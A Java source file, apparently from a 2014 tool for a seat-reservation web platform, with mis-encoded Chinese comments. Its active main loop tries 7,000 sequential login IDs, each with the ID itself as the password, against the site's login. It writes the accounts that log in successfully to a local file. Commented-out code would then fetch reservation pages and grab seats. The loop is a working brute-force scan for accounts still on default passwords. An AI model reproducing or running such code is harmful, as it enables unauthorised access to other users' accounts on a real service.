import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.Map;

import sun.reflect.ReflectionFactory.GetReflectionFactoryAction;

/**
 * <p>Title: MainTest.java</p>
 * <p>Description: xxxxƽ̨���</p>
 * <p>Copyright: Copyright (c) 2011-2015 ���˾�</p>
 * <p>Company: ���˾�</p>
 * @author CR
 * @version 1.0 ����ʱ�䣺2014-6-2 ����1:34:42
 */
public class MainTest {
	public static void main(String args[]) throws IOException{
		String userID = "0000";
		int num;
		//UserInfo user = new UserInfo();   // �����û���Ϣ��
		Map<String,String> roomList;
		//user.setTxt_LoginID("0000202930");
		//user.setTxt_Password("0000202930");
		
		FileOutputStream outputStream ;
		PrintStream print;
		outputStream = new FileOutputStream("d:/test.txt");
		print = new PrintStream(outputStream);
		for(num = 200000; num<207000; num++){
			UserInfo user = new UserInfo();   // �����û���Ϣ��
			user.setTxt_LoginID(userID+Integer.toString(num));
			user.setTxt_Password(userID+Integer.toString(num));
			PageProcessor pageProcessor = new PageProcessor();   //����ҳ�洦����
			pageProcessor.setUser(user);           //�����û�
			//���Ե�½
			if(!pageProcessor.login()){
				//����½ʧ��
				//System.out.println("0;"+pageProcessor.getLastError());
				
				//return;
			}else{
				//System.out.println("��½�ɹ�");
				print.println(userID+Integer.toString(num));
			}
		}
		print.close();
		outputStream.close();
		//��ȡ�������б� ����һ������2
		//��ȡ��λ�б� ����һ������
		//���ԤԼ���� ����һ������3
//		try {
//			System.out.println("viwstate3:"+user.get__VIEWSTATE3());
//			System.out.println("viewstate3"+user.get__EVENTVALIDATION3());
//			pageProcessor.getReservationPage("301001","001","2014/6/7");
//			System.out.println("viwstate3:"+user.get__VIEWSTATE3());
//			System.out.println("viewstate3"+user.get__EVENTVALIDATION3());
//		} catch (Exception e1) {
//			// TODO Auto-generated catch block
//			e1.printStackTrace();
//		}
//		//��ȡ��λ
//		try {
//			if(!pageProcessor.getMySeat("301001","001","2014/6/7")){
//				//��ʧ��
//				System.out.println("0;"+pageProcessor.getLastError());
//				return;
//			}else{
//				System.out.println(pageProcessor.getLastError());
//			}
//		} catch (Exception e) {
//			// TODO Auto-generated catch block
//			System.out.println("1;"+pageProcessor.getLastError());
//			e.printStackTrace();
//		}
	}
}
